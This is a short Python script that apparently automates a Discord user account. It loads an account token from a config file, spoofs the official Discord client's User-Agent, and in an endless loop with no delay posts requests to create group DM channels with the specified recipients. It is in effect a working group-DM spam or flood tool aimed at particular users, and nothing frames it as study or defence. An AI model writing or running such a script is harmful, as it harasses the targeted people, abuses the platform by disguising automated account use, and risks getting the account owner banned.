import json, requests

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')


while True:
    global cycling
    cycling = True
    while cycling:
      headers = {
          'Authorization': token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
      }
      requests.post('https://discordapp.com/api/v9/users/@me/channels', headers=headers, json={"recipients":["useridhere","useridhere"]})
